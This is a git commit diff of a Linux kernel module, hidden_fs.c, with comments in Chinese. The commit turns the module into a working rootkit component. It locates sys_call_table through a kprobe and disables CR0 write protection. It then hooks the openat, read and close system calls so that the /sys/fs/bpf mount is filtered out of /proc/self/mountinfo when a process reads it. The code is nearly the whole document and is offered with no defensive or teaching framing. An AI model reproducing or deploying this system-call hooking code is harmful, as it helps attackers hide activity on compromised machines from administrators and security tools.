581aac40df854ab6f152ef906beea8e89dfb124e
csc010228 <54738634+csc010228@users.noreply.github.com>
2021-10-31 12:34:36 +0800

    Update hidden_fs.c

--- hidden_fs.c
+++ hidden_fs.c
@@ -1,20 +1,35 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/unistd.h>
-#include <linux/time.h>
-#include <asm/uaccess.h>
-#include <linux/sched.h>
-#include <linux/kallsyms.h>
 #include <linux/kprobes.h>
+#include <linux/kallsyms.h>
 #include <linux/fs.h>
+#include <linux/syscalls.h>
+#include <linux/sched.h>
+#include <linux/unistd.h>
+#include <linux/file.h>
+#include <linux/uaccess.h>
+#include <asm/uaccess.h>
+#include <asm/types.h>
+#include <asm/processor.h>
+#include <asm/segment.h>
+#include <asm/unistd.h>
+#include <linux/thread_info.h>
+
+
+//proc文件系统中保存内核的文件系统信息的文件名
+#define MOUNTINFO_FILE_NAME "/proc/self/mountinfo"
+//要隐藏的文件系统的根目录名(前后要各加上一个空格)
+#define HIDDEN_FS_FILE_PATH " /sys/fs/bpf "
+#define FIRST_CHAR_OF_HIDDEN_FS_FILE_PATH ' '
+#define MOUNTINFO_MAX_LENGTH 131072
 
 MODULE_LICENSE("GPL");
 
 unsigned long *sys_call_table = 0;			/*系统调用表的指针*/
 
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);		/* typedef for kallsyms_lookup_name() so we can easily cast kp.addr */
-kallsyms_lookup_name_t kallsyms_lookup_name;		/*kallsyms_lookup_name_t函数指针*/
+kallsyms_lookup_name_t kallsyms_lookup_name_p;		/*kallsyms_lookup_name_t函数指针*/
 
 /*
 设置cr0寄存器的第16位为0，并把原始的cr0寄存器的值返回
@@ -43,23 +58,6 @@ void setback_cr0(unsigned int val)
 	asm volatile ("movq %%rax, %%cr0" :: "a"(val));
 }
 
-typedef long (*statfs_t)(const char * pathname,struct statfs *buf);
-statfs_t orig_statfs;
-
-asmlinkage long statfs_hook(const char * pathname,struct statfs *buf)
-{
-	typedef int (*do_statfs_native_t)(struct kstatfs *st, struct statfs *p);
-	do_statfs_native_t do_statfs_native=kallsyms_lookup_name("do_statfs_native");
-
-	struct kstatfs st;
-	int error = user_statfs(pathname, &st);
-	if (!error)
-		error = do_statfs_native(&st, buf);
-	printk("statfs\n");
-	return error;
-}
-
-
 /*
 获取kallsyms_lookup_name函数指针
 */
@@ -71,35 +69,241 @@ static void get_kallsyms_lookup_name(void) {
   	register_kprobe(&kp);
 
   	/* assign kallsyms_lookup_name symbol to kp.addr */
-  	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+  	kallsyms_lookup_name_p = (kallsyms_lookup_name_t) kp.addr;
     
   	/* done with the kprobe, so unregister it */
   	unregister_kprobe(&kp);
 }
 
+/*==================start hook systemcall=========================*/
+static void hook_systemcall_init(void)
+{
+	get_kallsyms_lookup_name();
+	sys_call_table=(unsigned long *) kallsyms_lookup_name_p("sys_call_table");			/* 获取系统调用服务首地址 */
+}
+
+typedef long (*hook_t)(const struct pt_regs * pt_registers);
+
+/*
+hook系统调用
+
+Parameters
+----------
+systemcall_num:要替换的系统调用的系统调用号
+hook:要替换的新的系统调用函数
+
+Return
+------
+返回旧的系统调用函数
+*/
+static hook_t hook_systemcall(unsigned int systemcall_num,hook_t hook)
+{
+	int orig_cr0;		/*原始cr0寄存器的值*/
+	hook_t orig_systemcall;
+	orig_systemcall=(hook_t)(sys_call_table[systemcall_num]);		/* 保存原始系统调用 */
+	orig_cr0 = set_cr0_16_0();	/* 设置cr0可更改 */
+	sys_call_table[systemcall_num]=(unsigned long int)hook;		/* 更改原始的系统调用服务地址 */
+	setback_cr0(orig_cr0);	/* 设置为原始的只读cr0 */
+	return orig_systemcall;
+}
+
+/*
+恢复原本的系统调用
+
+Parameters
+----------
+systemcall_num:系统调用号
+orig_systemcall:旧的系统调用
+*/
+static void unhook_systemcall(unsigned int systemcall_num,hook_t orig_systemcall)
+{
+	int orig_cr0;		/*原始cr0寄存器的值*/
+ 	orig_cr0 = set_cr0_16_0();	/* 设置cr0中对sys_call_table的更改权限 */
+	sys_call_table[systemcall_num]=(unsigned long int)orig_systemcall;			/*恢复原始系统调用*/
+    	setback_cr0(orig_cr0);	/* 恢复原有的中断向量表中的函数指针的值 */
+}
+/*================end hook systemcall=========================*/
+
+//一些关于/proc/slef/mountinfo的打开文件的全局信息
+static int is_mountinfo_open=0;
+static unsigned int mountinfo_fd;
+static pid_t open_mountinfo_pid;
+static char * mountinfo_content=NULL;
+static int mountinfo_size=0;
+static int mountinfo_read_offset=0;
+
+hook_t orig_openat;
+
+/*
+hook系统调用openat
+*/
+asmlinkage long my_openat(const struct pt_regs * pt_registers)
+{
+	int ret=orig_openat(pt_registers),err;
+	char * openat_filename=kvzalloc(sizeof(MOUNTINFO_FILE_NAME),GFP_KERNEL);
+	
+	err=copy_from_user(openat_filename,(char *)pt_registers->si,sizeof(MOUNTINFO_FILE_NAME));
+	
+	//检查要打开的文件是不是/proc/slef/mountinfo，如果是的话就记录下一些全局信息，准备给read系统调用使用
+	if(err == 0 && memcmp(openat_filename,MOUNTINFO_FILE_NAME,sizeof(MOUNTINFO_FILE_NAME))==0)
+	{
+		open_mountinfo_pid=task_pid_nr(current);
+		is_mountinfo_open=1;
+		mountinfo_fd=ret;
+		mountinfo_read_offset=0;
+		mountinfo_size=0;
+		mountinfo_content=NULL;
+	}
+	
+	kvfree(openat_filename);
+	
+	return ret;
+}
+
+hook_t orig_read;
+
+/*
+hook系统调用read
+*/
+asmlinkage long my_read(const struct pt_regs * pt_registers)
+{
+	int ret=orig_read(pt_registers),err,line_start,line_end,tag;
+	unsigned int fd=pt_registers->di;
+	size_t count=pt_registers->dx;
+	
+	//先检查要读取的文件是不是打开的/proc/slef/mountinfo
+	if(is_mountinfo_open==1 && task_pid_nr(current)==open_mountinfo_pid && fd==mountinfo_fd)
+	{
+		if(mountinfo_content==NULL)			//如果是第一次调读取/proc/slef/mountinfo的话，就不断地调用旧的read系统调用，将其所有的内容读出来，保存在内核中的一个字符串中
+		{
+			mountinfo_size=0;
+			mountinfo_content=kvzalloc(MOUNTINFO_MAX_LENGTH,GFP_KERNEL);
+			if(mountinfo_content==NULL)
+			{
+				return 0;
+			}
+			while(ret!=0)
+			{
+				err=copy_from_user(mountinfo_content+mountinfo_size,(char *)pt_registers->si,ret);
+				if(err!=0)
+				{
+					kvfree(mountinfo_content);
+					mountinfo_content=NULL;
+					return 0;
+				}
+				mountinfo_size+=ret;
+				ret=orig_read(pt_registers);
+			}
+			
+			//接下来检查读取出来的/proc/slef/mountinfo的每一行，如果发现有一行的内容和要隐藏的文件系统匹配的话，就将这一行的内容删除
+			line_start=0;
+			tag=0;
+			for(mountinfo_read_offset=0;mountinfo_read_offset<mountinfo_size;mountinfo_read_offset++)
+			{
+				if((mountinfo_size-mountinfo_read_offset)<sizeof(HIDDEN_FS_FILE_PATH))
+				{
+					break;
+				}
+				switch(mountinfo_content[mountinfo_read_offset])
+				{
+					case '\n':
+						if(tag==1)
+						{
+							line_end=mountinfo_read_offset;
+							while(line_end<mountinfo_size)
+							{
+								mountinfo_content[line_start]=mountinfo_content[line_end];
+								line_start++;
+								line_end++;
+							}
+							mountinfo_size-=(line_end-line_start);
+							goto end;
+						}
+						else
+						{
+							line_start=mountinfo_read_offset;
+						}
+						break;
+					case FIRST_CHAR_OF_HIDDEN_FS_FILE_PATH:
+						if(tag==0 && memcmp(mountinfo_content+mountinfo_read_offset,HIDDEN_FS_FILE_PATH,sizeof(HIDDEN_FS_FILE_PATH)-1)==0)
+						{
+							tag=1;
+						}
+						break;
+				}
+			}
+			end:
+			mountinfo_read_offset=0;
+		}
+		
+		
+		//之后每一次调用read读取/proc/slef/mountinfo的内容的时候都直接从内核中读取相应的字符串进行返回即可
+		if(mountinfo_size>=count)
+		{
+			err=copy_to_user((char *)pt_registers->si,mountinfo_content+mountinfo_read_offset,count);
+			if(err!=0)
+			{
+				return 0;
+			}
+			mountinfo_read_offset+=count;
+			mountinfo_size-=count;
+			ret=count;
+		}
+		else
+		{
+			err=copy_to_user((char *)pt_registers->si,mountinfo_content+mountinfo_read_offset,mountinfo_size);
+			if(err!=0)
+			{
+				return 0;
+			}
+			mountinfo_read_offset+=mountinfo_size;
+			ret=mountinfo_size;
+			mountinfo_size=0;
+		}
+		
+	}
+	return ret;
+}
+
+hook_t orig_close;
+
+/*
+hook系统调用close
+*/
+asmlinkage long my_close(const struct pt_regs * pt_registers)
+{
+	int ret=orig_close(pt_registers);
+	
+	unsigned int fd=pt_registers->di;
+	
+	//如果要关闭的文件是/proc/slef/mountinfo，就将对应的全局信息清空，然后释放内核中用于保存/proc/slef/mountinfo内容的字符串的空间即可
+	if(is_mountinfo_open==1 && task_pid_nr(current)==open_mountinfo_pid && fd==mountinfo_fd)
+	{
+		is_mountinfo_open=0;
+		kvfree(mountinfo_content);
+		mountinfo_content=NULL;
+	}
+	
+	return ret;
+}
+
+
 /*模块的初始化函数，模块的入口函数，加载模块*/
 static int __init init_hidden_fs(void)
 {
-	int orig_cr0;		/*原始cr0寄存器的值*/
-	printk("My syscall is starting。。。\n");
-	get_kallsyms_lookup_name();
-	sys_call_table=(unsigned long *) kallsyms_lookup_name("sys_call_table");			/* 获取系统调用服务首地址 */
-   	printk("sys_call_table: 0x%p\n", sys_call_table);
-	orig_statfs=(statfs_t)(sys_call_table[__NR_statfs]);		/* 保存原始系统调用 */
-	orig_cr0 = set_cr0_16_0();	/* 设置cr0可更改 */
-	sys_call_table[__NR_statfs]=(unsigned long int)statfs_hook;		/* 更改原始的系统调用服务地址 */
-	setback_cr0(orig_cr0);	/* 设置为原始的只读cr0 */
+   	hook_systemcall_init();
+   	orig_openat=hook_systemcall(__NR_openat,my_openat);
+   	orig_close=hook_systemcall(__NR_close,my_close);
+   	orig_read=hook_systemcall(__NR_read,my_read);
 	return 0;
 }
 
 /*出口函数，卸载模块*/
 static void __exit exit_hidden_fs(void)
 {
-	int orig_cr0;		/*原始cr0寄存器的值*/
- 	orig_cr0 = set_cr0_16_0();	/* 设置cr0中对sys_call_table的更改权限 */
-	sys_call_table[__NR_statfs]=(unsigned long int)orig_statfs;			/*恢复原始系统调用*/
-    setback_cr0(orig_cr0);	/* 恢复原有的中断向量表中的函数指针的值 */
-   	printk("My syscall exit....\n");	/* 恢复原有的cr0的值 */
+   	unhook_systemcall(__NR_openat,orig_openat);
+   	unhook_systemcall(__NR_close,orig_close);
+   	unhook_systemcall(__NR_read,orig_read);
 }
 
 module_init(init_hidden_fs);
